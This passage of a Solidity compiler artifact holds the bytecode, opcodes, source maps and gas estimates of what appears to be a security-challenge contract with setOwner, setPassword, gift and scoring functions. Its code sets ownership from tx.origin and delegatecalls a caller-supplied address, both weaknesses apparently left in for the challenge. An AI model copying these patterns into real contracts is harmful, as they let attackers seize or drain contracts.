JUMPDEST SWAP3 POP SWAP3 POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x5A7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x676966742063616C6C206572726F720000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x68E9A07E PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x4 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x674 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x659 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x6A1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x72D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x63616C6C206661696C6564000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x7A8 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH2 0x2022 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x7C6 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xcb GT 0xc4 0xd3 PUSH13 0xE1BD8456B2A9CA0309F237DBFB 0xb6 0x27 0xbd KECCAK256 0xb6 0xce 0xe6 0x4b 0xdc 0x23 DELEGATECALL PUSH19 0x3C2E0029000000000000000000000000000000 ",
							"sourceMap": "651:1736:0:-;;;936:56;8:9:-1;5:2;;;30:1;27;20:12;5:2;936:56:0;974:10;966:5;;:18;;;;;;;;;;;;;;;;;;651:1736;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806340caae0614610085578063522e11771461009c57806368e9a07e146100a6578063ade58ccb146100d3578063cbfc4bce14610143578063efedc66914610186578063fa391c64146101b1575b005b34801561009157600080fd5b5061009a6101c8565b005b6100a4610244565b005b3480156100b257600080fd5b506100d160048036038101908080359060200190929190505050610294565b005b3480156100df57600080fd5b506100e86102d5565b60405180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526020018281526020019250505060405180910390f35b34801561014f57600080fd5b50610184600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610322565b005b34801561019257600080fd5b5061019b610733565b6040518082815260200191505060405180910390f35b3480156101bd57600080fd5b506101c6610739565b005b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561020257600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60003073ffffffffffffffffffffffffffffffffffffffff163111151561026a57600080fd5b3073ffffffffffffffffffffffffffffffffffffffff16313411156102925760646002819055505b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102ce57600080fd5b8060015550565b60008060243d1415156102e757600080fd5b60405160246000823e7fffffffff00000000000000000000000000000000000000000000000000000000815116925080600401519150509091565b60008060008015158473ffffffffffffffffffffffffffffffffffffffff1663cbfc4bce7c010000000000000000000000000000000000000000000000000000000002604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405180828051906020019080838360005b838110156103f55780820151818401526020810190506103da565b50505050905090810190601f1680156104225780820380516001836020036101000a031916815260200191505b50915050600060405180830381855af491505015151415156104ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f756e7361666520657865637574696f6e0000000000000000000000000000000081525060200191505060405180910390fd5b6104b46102d5565b925092503073ffffffffffffffffffffffffffffffffffffffff16837c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af19250505090508015156105a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f676966742063616c6c206572726f72000000000000000000000000000000000081525060200191505060405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff166368e9a07e7c0100000000000000000000000000000000000000000000000000000000028360405160200180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526004018281526020019250505060405160208183030381529060405260405180828051906020019080838360005b83811015610674578082015181840152602081019050610659565b50505050905090810190601f1680156106a15780820380516001836020036101000a031916815260200191505b509150506000604051808303816000865af1915050905080151561072d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f63616c6c206661696c656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b50505050565b60025481565b60006002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156107a85760326002600082825401925050819055505b61202260015414156107c65760326002600082825401925050819055505b5600a165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x40CAAE06 EQ PUSH2 0x85 JUMPI DUP1 PUSH4 0x522E1177 EQ PUSH2 0x9C JUMPI DUP1 PUSH4 0x68E9A07E EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xADE58CCB EQ PUSH2 0xD3 JUMPI DUP1 PUSH4 0xCBFC4BCE EQ PUSH2 0x143 JUMPI DUP1 PUSH4 0xEFEDC669 EQ PUSH2 0x186 JUMPI DUP1 PUSH4 0xFA391C64 EQ PUSH2 0x1B1 JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x91 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9A PUSH2 0x1C8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA4 PUSH2 0x244 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x294 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE8 PUSH2 0x2D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x184 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x322 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x192 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19B PUSH2 0x733 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C6 PUSH2 0x739 JUMP JUMPDEST STOP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x202 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO ISZERO PUSH2 0x26A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE CALLVALUE GT ISZERO PUSH2 0x292 JUMPI PUSH1 0x64 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST JUMP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x2CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x24 RETURNDATASIZE EQ ISZERO ISZERO PUSH2 0x2E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x24 PUSH1 0x0 DUP3 RETURNDATACOPY PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP2 MLOAD AND SWAP3 POP DUP1 PUSH1 0x4 ADD MLOAD SWAP2 POP POP SWAP1 SWAP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 ISZERO ISZERO DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBFC4BCE PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x3F5 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x3DA JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x422 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP ISZERO ISZERO EQ ISZERO ISZERO PUSH2 0x4AC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x10 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x756E7361666520657865637574696F6E00000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x4B4 PUSH2 0x2D5 JUMP JUMPDEST SWAP3 POP SWAP3 POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x5A7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x676966742063616C6C206572726F720000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x68E9A07E PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x4 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x674 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x659 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x6A1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x72D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x63616C6C206661696C6564000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x7A8 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH2 0x2022 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x7C6 JUMPI PUSH1 0x32 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xcb GT 0xc4 0xd3 PUSH13 0xE1BD8456B2A9CA0309F237DBFB 0xb6 0x27 0xbd KECCAK256 0xb6 0xce 0xe6 0x4b 0xdc 0x23 DELEGATECALL PUSH19 0x3C2E0029000000000000000000000000000000 ",
							"sourceMap": "651:1736:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;821:107;;8:9:-1;5:2;;;30:1;27;20:12;5:2;821:107:0;;;;;;1000:167;;;;;;1594:151;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1594:151:0;;;;;;;;;;;;;;;;;;;;;;;;;;1753:394;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1753:394:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1175:411;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1175:411:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;731:20;;8:9:-1;5:2;;;30:1;27;20:12;5:2;731:20:0;;;;;;;;;;;;;;;;;;;;;;;2195:189;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2195:189:0;;;;;;821:107;886:4;865:26;;:10;:26;;;857:35;;;;;;;;911:9;903:5;;:17;;;;;;;;;;;;;;;;;;821:107::o;1000:167::-;1074:1;1060:4;1052:21;;;:23;1044:32;;;;;;;;1108:4;1100:21;;;1090:9;:31;1087:71;;;1143:3;1137:5;:9;;;;1087:71;1000:167::o;1594:151::-;1672:4;1652:25;;:10;:25;;;1644:34;;;;;;;;1723:3;1721:1;1714:13;1698:40;:::o;1753:394::-;1794:10;1806:11;1882:4;1866:14;1863:24;1856:32;1853:2;;;1901:1;1898;1891:12;1853:2;1936:4;1930:11;1978:4;1975:1;1970:3;1955:28;2020:66;2014:3;2008:10;2004:83;1997:90;;2124:3;2118:4;2114:14;2108:21;2101:28;;1838:302;;;:::o;1175:411::-;1336:10;1347:11;1387:12;1298:5;1230:73;;:7;:20;;1274:18;;;1251:42;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;1251:42:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;1251:42:0;1230:64;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;1230:64:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:73;;;1222:102;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1362:12;:10;:12::i;:::-;1335:39;;;;1410:4;1402:18;;1421:3;1402:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1387:38;;1444:7;1436:34;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1500:4;1492:18;;789:25;;;1532:3;1511:25;;;;;;;;;;;;;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;1511:25:0;;;1492:45;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;1492:45:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1483:54;;1556:7;1548:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1175:411;;;;:::o;731:20::-;;;;:::o;2195:189::-;2240:1;2234:5;:7;;;;2267:5;;;;;;;;;;;2255:17;;:10;:17;;;2252:57;;;2295:2;2288:5;;:9;;;;;;;;;;;2252:57;2334:6;2322:8;;:18;2319:58;;;2363:2;2356:5;;:9;;;;;;;;;;;2319:58;2195:189::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "407200",
								"executionCost": "20709",
								"totalCost": "427909"
							},
							"external": {
								"": "217",
								"complete()": "21009",
								"getReturns()": "infinite",
								"gift(address)": "infinite",
								"isCompleted()": "31244",
								"score()": "504",
								"setOwner()": "20438",
								"setPassword(uint256)": "20280"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "MSTORE"
								},
								{
									"begin": 936,
									"end": 992,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 936,
									"end": 992,
									"name": "POP"
								},
								{
									"begin": 974,
									"end": 984,
									"name": "CALLER"
								},
								{
									"begin": 966,
									"end": 971,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 966,
									"end": 971,
									"name": "DUP1"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "EXP"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "DUP2"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "SLOAD"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "DUP2"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "MUL"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "NOT"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "AND"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "SWAP1"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "DUP4"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "AND"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "MUL"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "OR"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "SWAP1"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "SSTORE"
								},
								{
									"begin": 966,
									"end": 984,
									"name": "POP"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "DUP1"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "CODECOPY"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 651,
									"end": 2387,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029",
									".code": [
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "MSTORE"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "LT"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
